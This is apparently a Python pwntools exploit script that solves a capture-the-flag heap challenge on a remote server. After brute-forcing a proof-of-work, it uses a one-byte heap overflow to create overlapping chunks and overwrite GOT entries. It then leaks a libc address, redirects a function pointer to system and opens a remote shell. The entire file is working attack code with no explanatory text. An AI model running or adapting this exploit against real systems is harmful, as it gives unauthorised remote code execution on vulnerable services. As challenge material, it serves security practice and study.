from pwn import *
import hashlib
from string import digits,letters
import random


context.arch = "amd64"

#r = process(["./bs"])

r = remote("47.89.11.82", 10009)


data = r.recvline()
substr = data.split(')')[0].split('+')[1]
ans = data.split()[-1].strip()

total = digits+letters
total*=4
total = list(total)
print total
count = 0
while True:
        count +=1
        if count %10000 == 0:
                print count
        sol = "".join(random.sample(total,4))
        if hashlib.sha256( sol+substr).hexdigest() == ans:
                print "OK"
                r.sendline(sol)
                break





def malloc(size,content):
	r.sendlineafter(">>","1")
	r.sendlineafter(":",str(size))
	r.sendafter(":",content)

def edit(idx,content):
	r.sendlineafter(">>","2")
	r.sendlineafter(":",str(idx))
	r.sendafter(":",content)

def remove(idx):
	r.sendlineafter(">>","3")
	r.sendlineafter(":",str(idx))




malloc(0x10,"a")

malloc(0x10,"a")

malloc(0x68,"a")

malloc(0x10,"a"*0x10)

malloc(0xf0,"a")

malloc(0x10,"a")

remove(2)

edit(3,"a"*0x10+"\xd9")

remove(0)

remove(4)

malloc(0x110,flat([0x20]*7,[0x78,0x6020ad]))

malloc(0x68,"a")

malloc(0x68,"a"*3+flat([0x602078,0x602018,0x602070,0x602058]))

edit(0,p64(0x400870)[:6])


r.sendlineafter(">>","3")
r.sendlineafter(":","1")

libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
system = libc+0x45390

edit(2,p64(system)[:6])
edit(3,"sh\x00")
edit(0,p64(0x400920)[:3])


print hex(libc)



r.interactive()
